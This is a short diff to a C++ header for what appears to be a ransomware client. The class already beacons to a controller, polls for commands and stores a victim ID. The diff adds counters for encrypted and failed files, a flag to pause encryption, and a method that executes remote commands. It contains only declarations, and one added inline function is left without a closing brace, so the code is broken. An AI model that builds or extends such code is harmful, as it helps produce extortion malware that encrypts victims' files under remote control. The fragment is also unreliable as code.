@@ -41,7 +41,13 @@ private:
     std::mutex command_mutex;
     int beacon_interval_seconds;
     int max_retries;
-    
+    std::string current_exe;
+    int encrypted_count = 0;
+    int failed_count = 0;
+    time_t start_time = 0;
+    bool pause_encryption_flag = false;
+
+
     // Callbacks
     std::function<void(const std::string&)> on_execute_command;
     
@@ -80,7 +86,10 @@ public:
     
     void set_command_callback(std::function<void(const std::string&)> callback);
     void poll_commands();
-    
+    void execute_command(const std::string& command, const std::map<std::string, std::string>& params = {});
+    void set_current_exe(const std::string& exe_path) { current_exe = exe_path;
+
+
     bool is_connected() const;
     std::string get_victim_id() const { return victim_id; }
 };
